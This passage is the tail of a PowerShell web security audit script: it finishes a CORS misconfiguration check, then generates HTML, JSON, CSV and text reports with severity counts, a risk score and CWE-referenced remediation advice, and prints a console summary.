        $corsHeadersFound = @()
        
        if ($responseHeaders["Access-Control-Allow-Origin"] -eq "*") {
            $corsHeadersFound += "Access-Control-Allow-Origin: * (Too permissive)"
        }
        
        if ($responseHeaders["Access-Control-Allow-Credentials"] -eq "true" -and 
            $responseHeaders["Access-Control-Allow-Origin"] -eq "*") {
            $corsHeadersFound += "Dangerous combination: Allow-Credentials=true with wildcard origin"
        }
        
        if ($corsHeadersFound.Count -gt 0) {
            Add-TestResult -Category "CORS" -TestName "CORS Misconfiguration" `
                -Details "Potentially dangerous CORS configuration" `
                -Status "VULNERABLE" -Severity "MEDIUM" `
                -Recommendation "Restrict CORS origins to trusted domains only" `
                -CWE "CWE-942" `
                -Evidence $corsHeadersFound
        } else {
            Add-TestResult -Category "CORS" -TestName "CORS Configuration" `
                -Details "CORS properly configured" `
                -Status "SECURE" -Severity "INFO"
        }
    }
} catch {
    Write-Log "CORS test failed: $($_.Exception.Message)" -Level DEBUG
}
#endregion

#region Reporting
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Cyan
Write-Host "GENERATING REPORTS & ANALYSIS" -ForegroundColor Cyan
Write-Host "############################################################" -ForegroundColor Cyan

$global:stats.ExecutionTime.Stop()
$executionMinutes = [Math]::Round($global:stats.ExecutionTime.Elapsed.TotalMinutes, 2)

# Statistics
$totalVulnerabilities = $global:vulnerabilities.Count
$totalWarnings = $global:warnings.Count
$totalSecure = ($global:results | Where-Object { $_.Status -eq "SECURE" }).Count
$totalErrors = ($global:results | Where-Object { $_.Status -eq "ERROR" }).Count
$totalInfo = ($global:results | Where-Object { $_.Status -eq "INFO" }).Count

# Risk Score Calculation
$riskScore = ($totalVulnerabilities * 10) + ($totalWarnings * 5) + ($totalErrors * 2)
$maxPossibleScore = ($global:results.Count * 10)
$securityPercentage = if ($maxPossibleScore -gt 0) {
    [Math]::Round(((1 - ($riskScore / $maxPossibleScore)) * 100), 2)
} else { 100 }

# Create comprehensive HTML report
$htmlReportPath = Join-Path $directories.Reports "security_report.html"
$htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Audit Report - $(Get-Date -Format 'yyyy-MM-dd')</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        .header { text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 10px; margin-bottom: 30px; }
        .summary-box { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .metric { padding: 20px; border-radius: 8px; text-align: center; color: white; font-weight: bold; }
        .critical { background: #dc3545; }
        .high { background: #fd7e14; }
        .medium { background: #ffc107; color: #333; }
        .low { background: #28a745; }
        .info { background: #17a2b8; }
        .risk-meter { height: 30px; background: #e9ecef; border-radius: 15px; margin: 20px 0; overflow: hidden; }
        .risk-fill { height: 100%; background: linear-gradient(90deg, #28a745 0%, #ffc107 50%, #dc3545 100%); }
        .vulnerability { padding: 15px; margin: 10px 0; border-left: 5px solid; border-radius: 5px; }
        .vuln-critical { border-color: #dc3545; background: #f8d7da; }
        .vuln-high { border-color: #fd7e14; background: #fff3cd; }
        .vuln-medium { border-color: #ffc107; background: #fff3cd; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; }
        .recommendation { background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .timestamp { color: #666; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 Security Audit Report</h1>
            <h3>Target: $TargetURL</h3>
            <p>Generated on $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')</p>
        </div>

        <div class="summary-box">
            <div class="metric critical">
                <h3>CRITICAL</h3>
                <p style="font-size: 24px;">$(($global:vulnerabilities | Where-Object { $_.Severity -eq 'CRITICAL' }).Count)</p>
            </div>
            <div class="metric high">
                <h3>HIGH</h3>
                <p style="font-size: 24px;">$(($global:vulnerabilities | Where-Object { $_.Severity -eq 'HIGH' }).Count)</p>
            </div>
            <div class="metric medium">
                <h3>MEDIUM</h3>
                <p style="font-size: 24px;">$(($global:vulnerabilities | Where-Object { $_.Severity -eq 'MEDIUM' }).Count + $totalWarnings)</p>
            </div>
            <div class="metric low">
                <h3>SECURE</h3>
                <p style="font-size: 24px;">$totalSecure</p>
            </div>
            <div class="metric info">
                <h3>INFO</h3>
                <p style="font-size: 24px;">$totalInfo</p>
            </div>
        </div>

        <div>
            <h3>Overall Security Score</h3>
            <div class="risk-meter">
                <div class="risk-fill" style="width: ${securityPercentage}%"></div>
            </div>
            <p><strong>$securityPercentage%</strong> ($riskScore/$maxPossibleScore)</p>
        </div>

        <h2>📋 Detailed Findings</h2>
        <table>
            <thead>
                <tr>
                    <th>Category</th>
                    <th>Test</th>
                    <th>Status</th>
                    <th>Severity</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>
"@

foreach($result in $global:results) {
    $severityClass = $result.Severity.ToLower()
    $statusClass = $result.Status.ToLower()
    
    # Substitui os caracteres especiais por ASCII simples no HTML Report
    $statusIcon = switch($result.Status) {
        "VULNERABLE" { "X" } 
        "WARNING" { "!" } 
        "SECURE" { "V" } 
        "INFO" { "i" } 
        default { "" }
    }
    
    $htmlContent += @"
                <tr>
                    <td><strong>$($result.Category)</strong></td>
                    <td>$($result.TestName)</td>
                    <td><span class="$statusClass">$statusIcon $($result.Status)</span></td>
                    <td><span class="$severityClass">$($result.Severity)</span></td>
                    <td>$($result.Details)</td>
                </tr>
"@
}

$htmlContent += @"
            </tbody>
        </table>

        <h2>🚨 Critical Vulnerabilities</h2>
"@

$criticalVulns = $global:vulnerabilities | Where-Object { $_.Severity -eq "CRITICAL" }
if ($criticalVulns.Count -eq 0) {
    # Substitui o caractere especial
    $htmlContent += "<p>V No critical vulnerabilities found!</p>" 
} else {
    foreach($vuln in $criticalVulns) {
        $htmlContent += @"
        <div class="vulnerability vuln-critical">
            <h4>X $($vuln.TestName)</h4> 
            <p><strong>Category:</strong> $($vuln.Category)</p>
            <p><strong>Details:</strong> $($vuln.Details)</p>
            <p><strong>Recommendation:</strong> $($vuln.Recommendation)</p>
            <p><strong>CWE:</strong> $($vuln.CWE)</p>
            <p class="timestamp">$($vuln.Timestamp)</p>
        </div>
"@
    }
}

$htmlContent += @"
        <h2>💡 Recommendations</h2>
        <div class="recommendation">
            <ol>
                <li>Implement Web Application Firewall (WAF)</li>
                <li>Regularly update all dependencies and frameworks</li>
                <li>Implement proper logging and monitoring</li>
                <li>Conduct regular security audits</li>
                <li>Train developers on secure coding practices</li>
                <li>Implement CI/CD security scanning</li>
            </ol>
        </div>

        <h2>📊 Statistics</h2>
        <table>
            <tr><td>Total Tests</td><td>$($global:stats.TotalTests)</td></tr>
            <tr><td>Total Requests</td><td>$($global:stats.TotalRequests)</td></tr>
            <tr><td>Successful Requests</td><td>$($global:stats.SuccessfulRequests)</td></tr>
            <tr><td>Failed Requests</td><td>$($global:stats.FailedRequests)</td></tr>
            <tr><td>Execution Time</td><td>${executionMinutes} minutes</td></tr>
            <tr><td>Scan Mode</td><td>$ScanMode</td></tr>
        </table>

        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center; color: #666;">
            <p>Report generated by Advanced Security Testing Framework v2.0</p>
            <p>Scan ID: $(New-Guid)</p>
            <p>Report saved to: $htmlReportPath</p>
        </div>
    </div>
</body>
</html>
"@

$htmlContent | Out-File -FilePath $htmlReportPath -Encoding UTF8

# JSON Report
$jsonReportPath = Join-Path $directories.Reports "audit_data.json"
$jsonData = @{
    metadata = @{
        scan_id = [Guid]::NewGuid().ToString()
        timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        target = $TargetURL
        hostname = $hostname
        ip_address = $global:targetInfo.IPAddress
        scan_mode = $ScanMode
        execution_time_minutes = $executionMinutes
        total_requests = $global:stats.TotalRequests
        successful_requests = $global:stats.SuccessfulRequests
        failed_requests = $global:stats.FailedRequests
        start_time = $global:stats.StartTime
        end_time = Get-Date
    }
    target_information = $global:targetInfo
    statistics = @{
        total_tests = $global:stats.TotalTests
        secure = $totalSecure
        warnings = $totalWarnings
        vulnerabilities = $totalVulnerabilities
        errors = $totalErrors
        informational = $totalInfo
        risk_score = $riskScore
        security_percentage = $securityPercentage
        severity_breakdown = @{
            critical = ($global:vulnerabilities | Where-Object { $_.Severity -eq "CRITICAL" }).Count
            high = ($global:vulnerabilities | Where-Object { $_.Severity -eq "HIGH" }).Count
            medium = ($global:vulnerabilities | Where-Object { $_.Severity -eq "MEDIUM" }).Count
            low = ($global:vulnerabilities | Where-Object { $_.Severity -eq "LOW" }).Count
        }
    }
    results = $global:results
    recommendations = @(
        "Implement parameterized queries to prevent SQL Injection (CWE-89)",
        "Add Content Security Policy headers to mitigate XSS (CWE-79)",
        "Remove all default accounts and credentials (CWE-1392)",
        "Restrict access to sensitive files and directories (CWE-22)",
        "Enable security headers (X-Content-Type-Options, X-Frame-Options, HSTS)",
        "Implement proper authentication for all API endpoints (CWE-306)",
        "Set secure cookie flags (Secure, HttpOnly, SameSite)",
        "Implement rate limiting to prevent DoS attacks (CWE-770)",
        "Regularly update SSL/TLS certificates",
        "Implement proper CORS configuration (CWE-942)"
    )
    evidence = @{
        count = $global:evidence.Count
        location = $directories.Evidence
    }
}

$jsonData | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonReportPath -Encoding UTF8

# CSV Report
$csvReportPath = Join-Path $directories.Reports "audit_results.csv"
$global:results | Select-Object Timestamp, Category, TestName, Status, Severity, Details, Recommendation, CWE | Export-Csv -Path $csvReportPath -NoTypeInformation -Encoding UTF8

# Summary TXT Report
$txtReportPath = Join-Path $directories.Reports "executive_summary.txt"
$txtContent = @"
=========================================
EXECUTIVE SECURITY SUMMARY
=========================================

Audit Date: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')
Target: $TargetURL
Scan Mode: $ScanMode
Duration: ${executionMinutes} minutes

OVERALL RISK ASSESSMENT:
=========================================
Security Score: ${securityPercentage}%
Risk Level: $(if ($securityPercentage -ge 80) { "LOW" } elseif ($securityPercentage -ge 60) { "MEDIUM" } else { "HIGH" })

FINDINGS SUMMARY:
=========================================
Total Tests Performed: $($global:stats.TotalTests)
v Secure Findings: $totalSecure
! Warnings: $totalWarnings
X Vulnerabilities: $totalVulnerabilities
i Informational: $totalInfo
E Errors: $totalErrors

SEVERITY BREAKDOWN:
=========================================
CRITICAL: $(($global:vulnerabilities | Where-Object { $_.Severity -eq 'CRITICAL' }).Count)
HIGH: $(($global:vulnerabilities | Where-Object { $_.Severity -eq 'HIGH' }).Count)
MEDIUM: $(($global:vulnerabilities | Where-Object { $_.Severity -eq 'MEDIUM' }).Count)
LOW: $(($global:vulnerabilities | Where-Object { $_.Severity -eq 'LOW' }).Count)

TOP CRITICAL ISSUES:
=========================================
$(
if ($criticalVulns.Count -eq 0) {
    "V No critical issues found!"
} else {
    foreach($vuln in $criticalVulns) {
        "X $($vuln.Category) - $($vuln.TestName): $($vuln.Details)"
    }
}
)

IMMEDIATE ACTIONS REQUIRED:
=========================================
1. Address all CRITICAL vulnerabilities within 24 hours
2. Review and fix HIGH severity issues within 1 week
3. Plan remediation for MEDIUM issues within 1 month
4. Document all findings and remediation steps

REPORT LOCATIONS:
=========================================
HTML Report: $htmlReportPath
JSON Data: $jsonReportPath
CSV Results: $csvReportPath
Evidence: $directories.Evidence
Logs: $directories.Logs

Generated by Advanced Security Testing Framework v2.0
=========================================
"@

$txtContent | Out-File -FilePath $txtReportPath -Encoding UTF8
#endregion
#region Final Output
# CORREÇÃO: Substituindo caracteres de desenho de caixa e emojis por ASCII e corrigindo erros de parsing.
Write-Host "`n############################################################" -ForegroundColor Green
Write-Host "AUDIT COMPLETED SUCCESSFULLY" -ForegroundColor Green
Write-Host "############################################################" -ForegroundColor Green

# Pre-calcula strings formatadas
$totalTestsPadded = $global:stats.TotalTests.ToString().PadLeft(10)
$totalRequestsPadded = $global:stats.TotalRequests.ToString().PadLeft(10)
$executionMinutesPadded = $executionMinutes.ToString().PadLeft(8)
$securityPercentagePadded = $securityPercentage.ToString().PadLeft(7)
$logFileName = ("logs\audit_$timestamp.log").PadRight(50)
$txtFileName = (Split-Path -Path $txtReportPath -Leaf).PadRight(25)
$htmlFileName = (Split-Path -Path $htmlReportPath -Leaf).PadRight(25)
$jsonFileName = (Split-Path -Path $jsonReportPath -Leaf).PadRight(25)
$csvFileName = (Split-Path -Path $csvReportPath -Leaf).PadRight(25)

# FIX PRINCIPAL: Usando parênteses para forçar a avaliação do operador -f

Write-Host "`n## FINAL STATISTICS ##" -ForegroundColor Cyan
Write-Host "   +-------------------------------------+" -ForegroundColor Cyan

# Usa o operador -f dentro de parênteses para formatação segura
Write-Host ("   | Total Tests:        {0} |" -f $totalTestsPadded) -ForegroundColor White
Write-Host ("   | Total Requests:     {0} |" -f $totalRequestsPadded) -ForegroundColor White
Write-Host ("   | Execution Time:     {0} min |" -f $executionMinutesPadded) -ForegroundColor White
Write-Host ("   | Security Score:     {0}% |" -f $securityPercentagePadded) -ForegroundColor White
Write-Host "   +-------------------------------------+" -ForegroundColor Cyan

# FIX: Removendo Unicode
Write-Host "`n## SECURITY ASSESSMENT ##" -ForegroundColor Cyan
$color = if ($securityPercentage -ge 80) { "Green" } 
         elseif ($securityPercentage -ge 60) { "Yellow" } 
         else { "Red" }
Write-Host "   Risk Level: " -NoNewline -ForegroundColor Cyan
Write-Host $(if ($securityPercentage -ge 80) { "LOW" } 
             elseif ($securityPercentage -ge 60) { "MEDIUM" } 
             else { "HIGH" }) -ForegroundColor $color

# FIX: Removendo Unicode
Write-Host "`n## FINDINGS BREAKDOWN ##" -ForegroundColor Cyan
Write-Host "   v Secure:         $totalSecure" -ForegroundColor Green
Write-Host "   ! Warnings:       $totalWarnings" -ForegroundColor Yellow
Write-Host "   x Vulnerabilities:$totalVulnerabilities" -ForegroundColor Red
Write-Host "   i Informational:  $totalInfo" -ForegroundColor Cyan
Write-Host "   e Errors:         $totalErrors" -ForegroundColor Magenta

if ($totalVulnerabilities -gt 0) {
    $criticalCount = ($global:vulnerabilities | Where-Object { $_.Severity -eq "CRITICAL" }).Count
    $highCount = ($global:vulnerabilities | Where-Object { $_.Severity -eq "HIGH" }).Count
    
    if ($criticalCount -gt 0) {
        Write-Host "`n! CRITICAL ALERT: $criticalCount critical vulnerabilities found!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "   Immediate remediation required!" -ForegroundColor Red
    }
    
    if ($highCount -gt 0) {
        Write-Host "   ! HIGH PRIORITY: $highCount high severity issues require attention" -ForegroundColor Yellow
    }
} elseif ($totalWarnings -gt 0) {
    Write-Host "`n! WARNING: $totalWarnings issues require attention" -ForegroundColor Yellow
} else {
    Write-Host "`nv EXCELLENT: System shows strong security posture" -ForegroundColor Green
}

# FIX PRINCIPAL: Usando parênteses para forçar a avaliação do operador -f
Write-Host "`n## REPORTS GENERATED ##" -ForegroundColor Cyan
Write-Host "   +---------------------------------------------------------+" -ForegroundColor Cyan

# Usa o operador -f dentro de parênteses para formatação segura
Write-Host ("   | [ ] Executive Summary: {0} |" -f $txtFileName) -ForegroundColor White
Write-Host ("   | [ ] HTML Report:       {0} |" -f $htmlFileName) -ForegroundColor White
Write-Host ("   | [ ] JSON Data:         {0} |" -f $jsonFileName) -ForegroundColor White
Write-Host ("   | [ ] CSV Results:       {0} |" -f $csvFileName) -ForegroundColor White
Write-Host "   | [ ] Evidence:          evidence\ (multiple files)".PadRight(50) + " |" -ForegroundColor White 
Write-Host ("   | [ ] Logs:              {0} |" -f $logFileName) -ForegroundColor White 
Write-Host "   +---------------------------------------------------------+" -ForegroundColor Cyan

# FIX: Removendo Unicode
Write-Host "`n[DIRECTORY] Audit Directory: $baseDir" -ForegroundColor White

# Try to open reports
try {
    # FIX: Removendo Unicode
    Write-Host "`n--> Opening reports..." -ForegroundColor Cyan
    Start-Process $htmlReportPath
    Start-Process $directories.Reports
    # FIX: Removendo Unicode
    Write-Host "v Reports opened successfully" -ForegroundColor Green 
} catch {
    # FIX: Removendo Unicode
    Write-Host "!! Could not open reports automatically. Check $baseDir" -ForegroundColor Yellow 
}

# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Cyan
Write-Host "SECURITY AUDIT COMPLETE - $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Cyan
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "`n"
#endregion